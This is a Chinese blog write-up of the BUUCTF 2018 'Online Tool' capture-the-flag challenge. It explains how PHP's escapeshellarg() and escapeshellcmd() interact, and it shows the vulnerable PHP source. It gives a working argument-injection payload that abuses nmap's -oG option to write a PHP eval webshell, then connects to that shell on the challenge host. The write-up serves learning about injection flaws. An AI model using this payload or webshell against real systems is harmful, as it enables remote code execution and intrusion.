---
title: BUUCTF2018 Online Tool
date: 2020-09-30 21:39:04
categories: CTF做题记录
---

# [BUUCTF 2018]Online Tool
>知识点：通过这个题好好认识一下escapeshellarg()与escapeshellcmd()这两个函数，[参考链接](https://www.mi1k7ea.com/2019/07/04/%E6%B5%85%E8%B0%88escapeshellarg%E4%B8%8E%E5%8F%82%E6%95%B0%E6%B3%A8%E5%85%A5)
<!--more-->
---
>escapeshellarg()
>>把字符串转码为可以在 shell 命令里使用的参数。
escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含 exec(), system() 执行运算符\
即如果输入内容不包含单引号，则直接对输入的字符串添加一对单引号括起来；如果输入内容包含单引号，则先对该单引号进行转义，再对剩余部分字符串添加相应对数的单引号括起来\
如果输入yq1ng's，对应'yq1ng'\\''s'

>escapeshellcmd()
>>shell 元字符转义\
escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。
反斜线（\）会在以下字符之前插入： &#;`|*?~<>^()[]{}$\, \x0A 和 \xFF。 ‘ 和 “ 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。\
即：1、有特殊字符-->转义；2、单、双引号不成对-->转义\
'yq1ng's'?-->'yq1ng's\\'\\;

>应用场景区别：一个控制参数，一个控制命令\
escapeshellarg()主要是为了防止用户的输入逃逸出“参数值”的位置，变成一个“参数选项”
>>处理过程：如果输入内容不包含单引号，则直接对输入的字符串添加一对单引号括起来；如果输入内容包含单引号，则先对该单引号进行转义，再对剩余部分字符串添加相应对数的单引号括起来\
场景功能：
1.确保用户只传递一个参数给命令
2.用户不能指定更多的参数一个
3.用户不能执行不同的命令

>escapeshellcmd()主要是防止用户利用shell的一些技巧（如分号、管道符、反引号等）来进行命令注入攻击
>>处理过程：如果输入内容中&#;`|*?~<>^()[]{}$\, \x0A 和 \xFF等特殊字符会被反斜杠给转义掉；如果单引号和双引号不是成对出现时，会被转义掉\
场景功能：
1.确保用户只执行一个命令
2.用户可以指定不限数量的参数
3.用户不能执行不同的命令

>escapeshellarg>escapeshellcmd参数注入\
原理：当用户输入包含单引号时，先用escapeshellarg()处理会给该单引号添加转义符，再用escapeshellcmd()处理时会将该添加的转义符再添加一个转义符，从而导致单引号被逃逸掉，从而造成参数注入漏洞的存在\
但如果是先用escapeshellcmd()函数过滤，再用escapeshellarg()函数过滤，则不存在参数注入漏洞
```php
<?php

if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];
}

if(!isset($_GET['host'])) {
    highlight_file(__FILE__);
} else {
    $host = $_GET['host'];
    $host = escapeshellarg($host);
    $host = escapeshellcmd($host);
    $sandbox = md5("glzjin". $_SERVER['REMOTE_ADDR']);
    echo 'you are in sandbox '.$sandbox;
    @mkdir($sandbox);
    chdir($sandbox);
    echo system("nmap -T5 -sT -Pn --host-timeout 2 -F ".$host);
}
```

这个题就是典型的字符逃逸了，但是特殊字符都凉了，这就要看看nmap入手，看他能看嘛，但是我只知道他能扫描端口，太菜了，看了师傅的wp才知道这玩意也能写木马，参数`-oG`
payload：`?host=' <?php @eval($_POST["yq1ng"]);?> -oG shell.php '`\
执行后返回
```
you are in sandbox 1287302c32807000ede1d0eb7b7f573aStarting Nmap 7.70 ( https://nmap.org ) at 2020-09-30 16:44 UTC Nmap done: 0 IP addresses (0 hosts up) scanned in 20.07 seconds Nmap done: 0 IP addresses (0 hosts up) scanned in 20.07 seconds
```
可以看出文件被保存到`1287302c32807000ede1d0eb7b7f573a`中，蚁剑连接
`http://11ed1649-41b6-4ef2-9ba4-d2ba64b475ba.node3.buuoj.cn/1287302c32807000ede1d0eb7b7f573a/shell.php`
![](https://raw.githubusercontent.com/yq1ng/blog/master/BUUCTF2018/image.6dyxikfhijx.png)

payload细看，我是在win上测试的，截图不太一样
![](https://raw.githubusercontent.com/yq1ng/blog/master/BUUCTF2018/image.4fzoeqnyeqt.png)